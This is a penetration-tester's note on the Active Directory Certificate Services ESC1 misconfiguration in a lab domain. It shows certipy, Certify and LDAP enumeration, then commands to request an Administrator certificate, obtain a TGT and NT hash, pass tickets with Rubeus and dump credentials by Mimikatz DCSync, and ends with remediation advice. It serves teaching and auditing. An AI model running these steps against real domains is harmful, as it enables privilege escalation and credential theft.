### Content

- [Overview](#overview)
	- [Requirements](#requirements)
- [From Linux](#from-linux)
	- [Linux - Enumeration](#linux---enumeration)
	- [Linux - Abuse](#linux---abuse)
- [From Windows](#from-windows)
	- [Windows - Enumeration](#windows---enumeration)
	- [Windows - Abuse](#windows---abuse)
	- [Sacrificial Logon Session](#sacrificial-logon-session)
- [Remediation](#remediation)

> Template Misconfiguration. 

---
### Overview

If a certificate template allows including a `subjectAltName` (`SAN`) different from the user making the certificate signing request (CSR), it would allow an attacker to request a certificate as any user in the domain using any low privilege compromised account.

#### Requirements

1. The template enrollment is allowed to low-privileged users.
2. Manager approval should be turned off (social engineering tactics can bypass these security measures).
3. No authorized signatures are required.
4. The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates.
5. The certificate template defines EKUs that enable authentication.
6. The certificate template allows requesters to specify a `subjectAltName (SAN)` in the `CSR`.

---
### From Linux
#### Linux - Enumeration

```bash
$ certipy find -u 'user@lab.local' -p <Password> -dc-ip <IP> -vulnerable -stdout

    Template Name                       : ESC1
    Display Name                        : ESC1
    Certificate Authorities             : lab-LAB-DC-CA
    Enabled                             : True # <<<<<<<<<
    Client Authentication               : True # <<<<<<<<<
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True # <<<<<<<<<
    Certificate Name Flag               : EnrolleeSuppliesSubject #<<<<<<<<<<<<<
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication # <<<<<<<<<
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False # <<<<<<<<<
    Requires Key Archival               : False 
    Authorized Signatures Required      : 0 # <<<<<<<<<
    Schema Version                      : 2
    Validity Period                     : 99 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-05-01T16:53:05+00:00
    Template Last Modified              : 2023-07-05T11:47:16+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users # <<<<<<<<<
                                          LAB.LOCAL\Enterprise Admins
      Object Control Permissions
        Owner                           : LAB.LOCAL\Administrator
        Full Control Principals         : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Owner Principals          : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Dacl Principals           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Enterprise Admins
        Write Property Enroll           : LAB.LOCAL\Domain Admins
                                          LAB.LOCAL\Domain Users
                                          LAB.LOCAL\Enterprise Admins
    [+] User Enrollable Principals      : LAB.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

We can see that:

- Enrollment Rights: `LAB.LOCAL\Domain Users`.
- Requires Manager Approval: `False`.
- Authorized Signature Required: `0`.
- Client Authentication: `True` or Extended Key Usage `Client Authentication`.
- Enrollee Supplies Subject: `True`.

#### Linux - Abuse

> Place the CA and the DC in the `/etc/hosts`

```bash
# Request a Certificate and include the alternate subject of an arbitrary user:
$ certipy req -u 'user@lab.local' -p <Password> -dc-ip <IP> -target <CA_IP> -ca lab-LAB-DC-CA -template ESC1 -upn Administrator
# If error "remote host timed out" occured, try again.

# Authenticate using the certrificate to get the user LM:NT hash and a TGT in .cchache file
certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip <IP>

# Using the .ccache TGT
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass LAB-DC.LAB.LOCAL
```

---
### From Windows
#### Windows - Enumeration

Using `Certify.exe`

```PowerShell
PS C:\> .\Certify.exe find /vulnerable
[SNIP]
    CA Name                               : LAB-DC.lab.local\lab-LAB-DC-CA
    Template Name                         : ESC1
[SNIP]
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : LAB\Domain Admins             
                                      LAB\Domain Users              
                                      LAB\Enterprise Admins         
[SNIP]  
```

Using `ActiveDirectory` module with a specific LDAP query:

```PowerShell
# !(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2) Excludes templates that require manager approval before issuing a cert.

# (mspki-ra-signature=0)(!(mspki-ra-signature=*)) Finds templates requiring zero authorized co-signatures on the CSR.

# (*.4.1.311.20.2.2: Smart Card Logon) - (*.5.5.7.3.2: Client Authentication) - (*.5.2.3.4: PKINIT Client Authentication) 

# mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1 The critical ESC1 flag. This means the template allows the requester to supply a Subject Alternative Name (SAN) in the CSR

# The -SearchBase parameter specifies the search base for the query. In this case, it's set to CN=Configuration,DC=lab,DC=local, which is the location in the Active Directory hierarchy where the query is performed.

PS C:\tools> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local' | fl


DistinguishedName : CN=OfflineRouter,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local
Name              : OfflineRouter
ObjectClass       : pKICertificateTemplate
ObjectGUID        : f1f9e21c-f31c-4d4e-85de-4682867c4d82

DistinguishedName : CN=ESC1,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local
Name              : ESC1
ObjectClass       : pKICertificateTemplate
ObjectGUID        : 210ae26a-2668-413c-aad8-983ea2a5434a
```

#### Windows - Abuse

```PowerShell
# Certificate Request with alternative SAN
PS C:\> .\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC1 /altname:administrator@lab.local
```

Convert PEM to PFX with one of the ways specified in the note [PEM to PFX](./PEM%20to%20PFX.md) 

```PowerShell
# Use Rubeus to get the user's hash and TGT:
PS C:\> .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
```

---
#### Sacrificial Logon Session

Using Rubeus to create a sacrificial logon session then import the Base64 Ticket into the PowerShell session to act as the impersonated user:

```PowerShell
PS C:\> .\Rubeus.exe createnetonly /program:powershell.exe /show

# In the new spawned shell
PS C:\> .\Rubeus.exe ptt /ticket:doIGQjCCBj6gAwIBBaEDAgEW<SNIP>

PS C:\> cat '\\LAB-DC\c$\users\Administrator\Desktop\secret.txt'
```

Use Mimikatz to Perform a DCSync Attack

```PowerShell
PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
PS C:\Tools> Import-Module .\Invoke-Mimikatz.ps1
PS C:\Tools> Invoke-Mimikatz -Command '"lsadump::dcsync /user:lab\Administrator"'
```

---
### Remediation

- Remove `ENROLLEE_SUPPLIES_SUBJECT` from any template accessible to non-privileged users.
- Restrict enrollment permissions to secure groups that require them.
- Review EKUs and remove Client Authentication unless explicitly necessary.
- Routinely audit existing templates with tools such as `Certipy` for potential misconfigurations.